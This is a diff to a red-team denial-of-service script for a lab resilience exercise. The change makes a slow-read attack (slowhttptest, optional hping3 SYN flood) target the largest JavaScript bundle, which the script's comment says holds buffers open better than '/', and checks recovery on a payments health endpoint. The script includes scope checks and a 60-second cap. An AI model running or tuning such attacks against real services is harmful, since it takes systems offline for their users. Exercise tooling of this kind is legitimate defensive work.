@@ -7,7 +7,7 @@
 #   layer remediation usually can't heal and can drown Prometheus/Loki - use
 #   only as a separate secondary scenario, never the recovery demo).
 # Usage: ./dos.sh [TARGET_IP] [PORT] [DURATION_SEC<=60]
-#   Env: MODE (slowread default | slowloris), ENDPOINT (default /), CONN, RATE, SYN_FLOOD=1
+#   Env: MODE (slowread default | slowloris), ENDPOINT (default: auto /assets/*.js, fallback /), CONN, RATE, SYN_FLOOD=1
 # Stop: Ctrl-C, or: pkill -f slowhttptest; pkill -f hping3
 set -euo pipefail
 source "$(dirname "$0")/../_lib/guard.sh"
@@ -15,12 +15,22 @@ source "$(dirname "$0")/../_lib/guard.sh"
 TARGET="${1:-${TARGET:-172.16.147.10}}"
 PORT="${2:-${PORT:-8080}}"
 DURATION="${3:-${DURATION:-45}}"
-ENDPOINT="${ENDPOINT:-/}"
+ENDPOINT="${ENDPOINT:-}"
 MODE="${MODE:-slowread}"       # slowread (lands here) | slowloris (mitigated by the front tier)
 CONN="${CONN:-8000}"
 RATE="${RATE:-500}"
 SYN_FLOOD="${SYN_FLOOD:-0}"
 ra_require_scope "$TARGET"
+
+# Le HTML "/" ne fait que quelques centaines d'octets : mesuré le 20/10/2026, 8000
+# connexions en slow-read pendant 30 s n'ont produit aucune sonde en échec. Le gros
+# bundle JS est ce qui tient réellement les buffers ouverts. On le résout à chaud
+# (le hash change à chaque build), avec repli sur "/" si le front n'expose pas de bundle.
+if [ -z "$ENDPOINT" ]; then
+  ENDPOINT="$(curl -sk -m 5 "http://$TARGET:$PORT/" | grep -oE '/assets/[^"]+\.js' | head -1 || true)"
+  [ -n "$ENDPOINT" ] || ENDPOINT="/"
+  echo "[*] ENDPOINT auto: $ENDPOINT"
+fi
 
 if [ "$DURATION" -gt 60 ]; then
   echo "[-] Refusing: DURATION=$DURATION > 60s. Keep Clip Chrono compatible."
@@ -40,7 +50,7 @@ cleanup() {
   echo ""; echo "[*] Stopping... $(ra_now)"
   pkill -f "slowhttptest.*$TARGET" || true
   pkill -f "hping3.*$TARGET" || true
-  echo "[*] Stopped. Verify: curl -m 10 http://$TARGET:$PORT/health"
+  echo "[*] Stopped. Verify: curl -m 10 http://$TARGET:$PORT/api/payments/health"
 }
 trap cleanup INT TERM EXIT
 
@@ -78,6 +88,6 @@ fi
 
 echo "[*] Attack window ended: $(ra_now)"
 trap - INT TERM EXIT
-echo "[+] Verify recovery: curl -m 10 http://$TARGET:$PORT/health"
-curl -m 10 -s "http://$TARGET:$PORT/health" || echo "[!] Service still down - notify Blue team."
+echo "[+] Verify recovery: curl -m 10 http://$TARGET:$PORT/api/payments/health"
+curl -m 10 -s "http://$TARGET:$PORT/api/payments/health" || echo "[!] Service still down - notify Blue team."
 echo ""
